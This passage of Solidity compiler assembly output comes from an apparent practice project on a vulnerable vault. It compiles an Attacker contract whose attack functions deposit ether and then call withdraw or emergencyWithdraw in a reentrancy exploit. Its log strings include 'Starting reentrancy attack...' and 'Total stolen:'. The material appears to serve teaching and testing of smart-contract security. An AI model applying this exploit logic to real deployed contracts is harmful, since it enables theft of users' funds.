\"lib/forge-std/src/console.sol\":7273:7275  p1 */\n      dup3\n        /* \"lib/forge-std/src/console.sol\":7222:7276  abi.encodeWithSignature(\"log(string,uint256)\", p0, p1) */\n      add(0x24, mload(0x40))\n      tag_77\n      swap3\n      swap2\n      swap1\n      tag_78\n      jump\t// in\n    tag_77:\n      0x40\n      dup1\n      mload\n      not(0x1f)\n      dup2\n      dup5\n      sub\n      add\n      dup2\n      mstore\n      swap2\n      swap1\n      mstore\n      0x20\n      dup2\n      add\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n      and\n      shl(0xe2, 0x2d839cb3)\n      or\n      swap1\n      mstore\n        /* \"lib/forge-std/src/console.sol\":7206:7221  _sendLogPayload */\n      tag_79\n        /* \"lib/forge-std/src/console.sol\":7206:7277  _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1)) */\n      jump\t// in\n    tag_76:\n        /* \"lib/forge-std/src/console.sol\":7139:7284  function log(string memory p0, uint256 p1) internal pure {... */\n      pop\n      pop\n      jump\t// out\n        /* \"lib/forge-std/src/console.sol\":6191:6312  function log(string memory p0) internal pure {... */\n    tag_28:\n        /* \"lib/forge-std/src/console.sol\":6246:6305  _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0)) */\n      tag_81\n        /* \"lib/forge-std/src/console.sol\":6301:6303  p0 */\n      dup2\n        /* \"lib/forge-std/src/console.sol\":6262:6304  abi.encodeWithSignature(\"log(string)\", p0) */\n      add(0x24, mload(0x40))\n      tag_82\n      swap2\n      swap1\n      tag_83\n      jump\t// in\n    tag_82:\n      0x40\n      dup1\n      mload\n      not(0x1f)\n      dup2\n      dup5\n      sub\n      add\n      dup2\n      mstore\n      swap2\n      swap1\n      mstore\n      0x20\n      dup2\n      add\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n      and\n      shl(0xe2, 0x104c13eb)\n      or\n      swap1\n      mstore\n        /* \"lib/forge-std/src/console.sol\":6246:6261  _sendLogPayload */\n      tag_79\n        /* \"lib/forge-std/src/console.sol\":6246:6305  _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0)) */\n      jump\t// in\n    tag_81:\n        /* \"lib/forge-std/src/console.sol\":6191:6312  function log(string memory p0) internal pure {... */\n      pop\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4301:4428  function getVaultUserBalance() external view override returns (uint256) {... */\n    tag_47:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4364:4371  uint256 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4395  vault */\n      dup1\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4421  vault.getBalance(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0xf8b2cb4f)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4415:4419  this */\n      address\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4421  vault.getBalance(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1354:1405   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4395  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4406  vault.getBalance */\n      0xf8b2cb4f\n      swap1\n        /* \"#utility.yul\":1327:1345   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4390:4421  vault.getBalance(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_89\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_89:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_90\n      swap2\n      swap1\n      tag_91\n      jump\t// in\n    tag_90:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4383:4421  return vault.getBalance(address(this)) */\n      swap1\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4301:4428  function getVaultUserBalance() external view override returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1721:2057  function attackDepositBonus() external payable override {... */\n    tag_54:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1808:1815  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1795:1804  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1795:1815  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1787:1839  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      tag_93\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":2964:2966   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1787:1839  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":2946:2967   */\n      mstore\n        /* \"#utility.yul\":3003:3005   */\n      0x13\n        /* \"#utility.yul\":2983:3001   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":2976:3006   */\n      mstore\n      shl(0x6b, 0x09ccacac840c2e840d8cac2e6e84062408aa89)\n        /* \"#utility.yul\":3022:3040   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3015:3064   */\n      mstore\n        /* \"#utility.yul\":3081:3099   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1787:1839  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n    tag_94:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_93:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1858:1899  console.log(\"Attacking deposit bonus...\") */\n      tag_96\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x41747461636b696e67206465706f73697420626f6e75732e2e2e000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1858:1869  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1858:1899  console.log(\"Attacking deposit bonus...\") */\n      jump\t// in\n    tag_96:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1967:1972  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1967:1980  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1988:1997  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1967:2000  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_97\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_97:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_99\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_99:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2019:2050  console.log(\"Bonus exploited!\") */\n      tag_100\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x10\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x80, 0x426f6e7573206578706c6f6974656421)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2019:2030  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2019:2050  console.log(\"Bonus exploited!\") */\n      jump\t// in\n    tag_100:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1721:2057  function attackDepositBonus() external payable override {... */\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2111:2538  function attackEmergencyWithdraw() external payable override {... */\n    tag_56:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2202:2203  0 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2190:2199  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2190:2203  msg.value > 0 */\n      gt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2182:2226  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_102\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3312:3314   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2182:2226  require(msg.value > 0, \"Need ETH to attack\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3294:3315   */\n      mstore\n        /* \"#utility.yul\":3351:3353   */\n      0x12\n        /* \"#utility.yul\":3331:3349   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3324:3354   */\n      mstore\n      shl(0x70, 0x4e6565642045544820746f2061747461636b)\n        /* \"#utility.yul\":3370:3388   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3363:3411   */\n      mstore\n        /* \"#utility.yul\":3428:3446   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2182:2226  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_94\n        /* \"#utility.yul\":3110:3452   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2182:2226  require(msg.value > 0, \"Need ETH to attack\") */\n    tag_102:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2245:2290  console.log(\"Attacking emergencyWithdraw...\") */\n      tag_105\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x41747461636b696e6720656d657267656e637957697468647261772e2e2e0000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2245:2256  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2245:2290  console.log(\"Attacking emergencyWithdraw...\") */\n      jump\t// in\n    tag_105:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2354:2359  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2354:2367  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2375:2384  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2354:2387  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_106\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_106:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_108\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_108:\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2448  vault */\n      0x00\n      dup1\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2468  vault.emergencyWithdraw() */\n      0x40\n      dup1\n      mload\n      shl(0xe2, 0x36cb886f)\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2448  vault */\n      swap1\n      swap3\n      and\n      swap6\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2466  vault.emergencyWithdraw */\n      0xdb2e21bc\n      swap5\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2468  vault.emergencyWithdraw() */\n      0x04\n      dup1\n      dup3\n      add\n      swap5\n      pop\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2448  vault */\n      dup4\n      dup8\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2443:2468  vault.emergencyWithdraw() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_109\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_109:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_111\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_111:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2487:2531  console.log(\"Emergency withdraw exploited!\") */\n      tag_100\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1d\n      dup2\n      mstore\n      0x20\n      add\n      0x456d657267656e6379207769746864726177206578706c6f6974656421000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2487:2498  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2487:2531  console.log(\"Emergency withdraw exploited!\") */\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":730:1671  function attack() external payable override {... */\n    tag_58:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":805:812  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":792:801  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":792:812  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:846  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n      tag_114\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3659:3661   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:846  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3641:3662   */\n      mstore\n        /* \"#utility.yul\":3698:3700   */\n      0x1d\n        /* \"#utility.yul\":3678:3696   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3671:3701   */\n      mstore\n        /* \"#utility.yul\":3737:3768   */\n      0x4e656564206174206c6561737420312045544820746f2061747461636b000000\n        /* \"#utility.yul\":3717:3735   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3710:3769   */\n      mstore\n        /* \"#utility.yul\":3786:3804   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:846  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n      tag_94\n        /* \"#utility.yul\":3457:3810   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:846  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n    tag_114:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":865:909  console.log(\"Starting reentrancy attack...\") */\n      tag_117\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1d\n      dup2\n      mstore\n      0x20\n      add\n      0x5374617274696e67207265656e7472616e63792061747461636b2e2e2e000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":865:876  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":865:909  console.log(\"Starting reentrancy attack...\") */\n      jump\t// in\n    tag_117:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":919:982  console.log(\"Initial attacker balance:\", address(this).balance) */\n      tag_118\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x19\n      dup2\n      mstore\n      0x20\n      add\n      0x496e697469616c2061747461636b65722062616c616e63653a00000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":960:981  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":919:930  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":919:982  console.log(\"Initial attacker balance:\", address(this).balance) */\n      jump\t// in\n    tag_118:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":992:1057  console.log(\"Initial vault balance:\", vault.getContractBalance()) */\n      tag_119\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x16\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x51, 0x24b734ba34b0b6103b30bab63a103130b630b731b29d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1030:1035  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1030:1054  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1030:1056  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_121\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_121:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_122\n      swap2\n      swap1\n      tag_91\n      jump\t// in\n    tag_122:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":992:1003  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":992:1057  console.log(\"Initial vault balance:\", vault.getContractBalance()) */\n      jump\t// in\n    tag_119:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1123:1128  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1123:1136  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1144:1153  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1123:1156  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_123\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_123:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_125\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_125:\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1175:1245  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x16\n      dup2\n      mstore\n      shl(0x51, 0x2130b630b731b29030b33a32b9103232b837b9b4ba1d)\n      0x20\n      dup3\n      add\n      mstore\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1218  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1244  vault.getBalance(address(this)) */\n      swap2\n      mload\n      shl(0xe0, 0xf8b2cb4f)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1238:1242  this */\n      address\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1244  vault.getBalance(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1354:1405   */\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1175:1245  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n      tag_126\n      swap6\n      pop\n      swap1\n      swap4\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1218  vault */\n      swap1\n      swap2\n      and\n      swap2\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1229  vault.getBalance */\n      0xf8b2cb4f\n      swap1\n        /* \"#utility.yul\":1327:1345   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1213:1244  vault.getBalance(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_121\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1175:1245  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n    tag_126:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1328:1329  0 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1314:1325  attackCount */\n      0x01\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1314:1329  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1339:1350  totalStolen */\n      0x02\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1339:1354  totalStolen = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1417  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1437  vault.withdraw(msg.value) */\n      mload(0x40)\n      shl(0xe0, 0x2e1a7d4d)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1427:1436  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1437  vault.withdraw(msg.value) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":815:840   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1417  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1426  vault.withdraw */\n      0x2e1a7d4d\n      swap1\n        /* \"#utility.yul\":788:806   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1412:1437  vault.withdraw(msg.value) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_132\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_132:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_134\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_134:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1456:1488  console.log(\"Attack completed!\") */\n      tag_135\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x11\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x78, 0x41747461636b20636f6d706c6574656421)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1456:1467  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1456:1488  console.log(\"Attack completed!\") */\n      jump\t// in\n    tag_135:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1498:1539  console.log(\"Total stolen:\", totalStolen) */\n      tag_136\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0d\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x99, 0x2a37ba30b61039ba37b632b71d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1527:1538  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1498:1509  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1498:1539  console.log(\"Total stolen:\", totalStolen) */\n      jump\t// in\n    tag_136:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1549:1612  console.log(\"Final vault balance:\", vault.getContractBalance()) */\n      tag_137\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x61, 0x2334b730b6103b30bab63a103130b630b731b29d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1585:1590  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1585:1609  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1585:1611  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_121\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1549:1612  console.log(\"Final vault balance:\", vault.getContractBalance()) */\n    tag_137:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1636:1664  AttackCompleted(totalStolen) */\n      0x4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f9\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1652:1663  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1636:1664  AttackCompleted(totalStolen) */\n      mload(0x40)\n      tag_141\n      swap2\n        /* \"#utility.yul\":815:840   */\n      dup2\n      mstore\n        /* \"#utility.yul\":803:805   */\n      